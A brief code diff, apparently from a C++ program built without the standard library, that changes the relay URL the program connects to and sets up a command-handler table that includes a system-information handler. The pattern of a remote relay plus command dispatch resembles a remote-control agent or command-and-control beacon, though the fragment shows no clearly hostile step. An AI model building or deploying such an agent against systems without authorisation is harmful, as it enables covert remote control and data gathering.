@@ -4,7 +4,7 @@
 
 INT32 start()
 {
-    auto url = "https://relay.nostdlib.workers.dev/ws"_embed;
+    auto url = "https://relay.nostdlib.workers.dev/agent"_embed;
 
     CommandHandler commandHandlers[CommandType::CommandTypeCount] = {nullptr};
     commandHandlers[CommandType::Command_GetSystemInfo] = EMBED_FUNC(Handle_GetSystemInfoCommand);
